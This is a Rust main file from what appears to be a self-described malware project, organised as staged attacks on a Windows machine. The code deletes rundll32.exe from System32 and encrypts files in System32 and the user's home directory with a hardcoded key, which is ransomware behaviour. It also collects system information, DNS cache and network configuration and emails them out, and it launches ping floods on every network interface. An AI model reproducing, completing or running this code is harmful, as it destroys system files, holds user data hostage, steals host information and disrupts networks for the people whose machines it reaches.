mod utils;
mod del_file;
mod img;
mod file_io;
mod hash;
mod sysInfo_gathering;
mod tranfer;
mod dns;
mod ping_flood;

use serde::{Deserialize, Serialize};
use serde_json::Result;

#[derive(Serialize, Deserialize)]
struct Phase{
    first: u8,
    second: u8,
    last: u8,
}

impl Phase {
    fn new() -> Self{
        Phase { first: 0,second: 0, last: 0 }
    }

    fn first_attack(self) -> Self{
        del_file::init_delete_file("/C:/Windows/System32/rundll32.exe");
                
        img::open();

        Self::done_first(self)
    }

    fn second_attack(self) -> Self{
        // https://github.com/dongsub-joung/rust_CLI/blob/main/file_hashing_cli/src/main.rs
        // search some *.dll files in sys32 -> save a .txt file
        let search_dir= "/C:/Windows/System32";
        let _= file_io::save_searced_files(search_dir);
        
        let file_names_v: Vec<String>= file_io::read_a_file(search_dir).unwrap_or(
            Vec::new()
        );

        for file in file_names_v {
            let pwd= format!("{}/{}", search_dir, file);
            Self::init_ransome(pwd);
        }

        // home directory
        let user_name= whoami::username();
        let home_search_dir= format!("/C:/{}/", user_name);
        let _= file_io::save_searced_files(&home_search_dir);
        let file_names_v2: Vec<String>= file_io::read_a_file(&home_search_dir).unwrap_or(
            Vec::new()
        );
        
        // @todo visit_dirs, if true(1) loop, or 0 end.
        let file_list= file_io::get_files_in_folder(&home_search_dir)
            .unwrap_or(Vec::new());

        for file_name_type in file_list{
            let file_name= file_name_type.file_name().unwrap();
            let pwd= format!("{}/{:?}.", home_search_dir, file_name);
            Self::init_ransome(pwd);
        }

        // end
        utils::play_audio_file();
        self.done_sencond()
    }

    fn the_last_attack(self) -> Self{

        self.done_last()
    }

    fn init_ransome(pwd: String) {
        let mut result: Vec<u8>= Vec::new();
        let key = b"MyNameIsJoungDongSub"; // Replace with your own key
        let iv = b"SomeOneHelpMePlz"; // Replace with your own initialization vector

        // let plaintext = "Hello, this is a secret message!";
        let plaintext= file_io::io_file::selecteing_file(&pwd)
            .expect("can't parse the data");

        result= match hash::hashing::encrypt_string(key, iv, plaintext.as_str()) {
            Ok(ciphertext) => {
                ciphertext
            },
            
            Err(e) => {
                eprintln!("Encryption error: {:?}", e);
                let mut null_vec: Vec<u8>= Vec::new();
                null_vec
            },
        };

        file_io::io_file::saving_file(&result).expect("faild a saveing work");

        println!("Done!");
    }
    
    fn done_first(mut self) -> Self{
        self.first= 1;
        self
    }
     
    fn done_sencond(mut self) -> Self{
        self.second= 1;
        self
    }
     
    fn done_last(mut self) -> Self{
        self.last= 1;
        self
    }
}

fn main() {
    let mut code= Phase::new();

    utils::show_logo();

    code= Phase::first_attack(code);
    code= Phase::second_attack(code);

    // https://github.com/dongsub-joung/malwares/tree/main/systemInfGathering
    let _= sysInfo_gathering::init(); // ./report.html
    let _= tranfer::init_transfer_html("./report.html");
    

    code= Phase::the_last_attack(code);
    
    dns::save_dns_cache();
    dns::save_ipfonfig();
    tranfer::init_mail("C://dnscachecontents.txt".to_string());
    tranfer::init_mail("C://ip_all.txt".to_string());
    
    // @todo cut off network
    for iface in get_if_addrs::get_if_addrs().unwrap(){
        ping_flood::init_ping_flood(iface);
    }

    let slice_string_in_json_format = serde_json::to_string(&code).unwrap_or("Err".to_string());
    tranfer::init_mail_by_data(slice_string_in_json_format);
    utils::print_time();
    utils::done();
}